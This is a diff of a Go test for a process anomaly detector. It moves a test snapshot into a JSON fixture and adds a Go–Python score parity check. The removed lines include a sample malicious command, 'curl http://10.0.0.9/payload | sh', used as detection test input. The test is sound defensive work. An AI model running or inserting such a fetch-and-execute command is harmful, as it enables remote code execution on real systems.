@@ -206,7 +206,8 @@ func TestLoadModelBundleRejectsInvalidExplicitBundle(t *testing.T) {
 }
 
 func TestLoadModelBundleLoadsCollectedBundle(t *testing.T) {
-	raw, err := os.ReadFile(filepath.Join(repositoryRoot(t), "test/data/learning/model-bundle.json"))
+	root := repositoryRoot(t)
+	raw, err := os.ReadFile(filepath.Join(root, "test/data/learning/model-bundle.json"))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -231,15 +232,15 @@ func TestLoadModelBundleLoadsCollectedBundle(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	signals := detector.Process(domainprocess.Snapshot{
-		StableID: "proc-evil", ParentStableID: "proc-unknown", LineageID: "proc-evil", Binary: "/bin/bash", Revision: 1,
-		Argv: []string{"bash", "-c", "curl http://10.0.0.9/payload | sh", "--no-profile", "--debug"}, Networks: []string{"10.0.0.9:443"},
-		EventRefs: []string{"anomaly-001"}, State: domainprocess.StateActive,
-	})
-	if len(signals) != 1 {
+	fixture := loadInferenceParity(t, root)
+	signals := detector.Process(fixture.snapshot())
+	if !fixture.Candidate || len(signals) != 1 {
 		t.Fatalf("signals = %+v", signals)
 	}
-	replayRaw, err := os.ReadFile(filepath.Join(repositoryRoot(t), "test/data/learning/replay-signals.ndjson"))
+	if math.Float32bits(signals[0].LocalRarity) != math.Float32bits(fixture.Score) {
+		t.Fatalf("Go score = %f, parity score = %f", signals[0].LocalRarity, fixture.Score)
+	}
+	replayRaw, err := os.ReadFile(filepath.Join(root, "test/data/learning/replay-signals.ndjson"))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -252,6 +253,48 @@ func TestLoadModelBundleLoadsCollectedBundle(t *testing.T) {
 	}
 	if signals[0].ID != expected.ID || math.Float32bits(signals[0].LocalRarity) != math.Float32bits(expected.LocalRarity) {
 		t.Fatalf("Go signal = %s/%f, Python signal = %s/%f", signals[0].ID, signals[0].LocalRarity, expected.ID, expected.LocalRarity)
+	}
+}
+
+type inferenceParity struct {
+	Candidate bool          `json:"candidate"`
+	Score     float32       `json:"score"`
+	Profile   parityProfile `json:"profile"`
+}
+
+type parityProfile struct {
+	StableID       string            `json:"stable_id"`
+	ParentStableID string            `json:"parent_stable_id"`
+	LineageID      string            `json:"lineage_id"`
+	Binary         string            `json:"binary"`
+	State          string            `json:"state"`
+	Argv           []string          `json:"argv"`
+	Files          []string          `json:"files"`
+	Networks       []string          `json:"networks"`
+	EventRefs      []string          `json:"event_refs"`
+	Revision       uint64            `json:"revision"`
+	Labels         map[string]string `json:"labels"`
+}
+
+func loadInferenceParity(t testing.TB, root string) inferenceParity {
+	t.Helper()
+	raw, err := os.ReadFile(filepath.Join(root, "test/data/learning/inference-parity.json"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	var fixture inferenceParity
+	if err := json.Unmarshal(raw, &fixture); err != nil {
+		t.Fatal(err)
+	}
+	return fixture
+}
+
+func (fixture inferenceParity) snapshot() domainprocess.Snapshot {
+	profile := fixture.Profile
+	return domainprocess.Snapshot{
+		StableID: profile.StableID, ParentStableID: profile.ParentStableID, LineageID: profile.LineageID,
+		Binary: profile.Binary, Argv: profile.Argv, Revision: profile.Revision, State: domainprocess.State(profile.State),
+		Labels: profile.Labels, Files: profile.Files, Networks: profile.Networks, EventRefs: profile.EventRefs,
 	}
 }
 
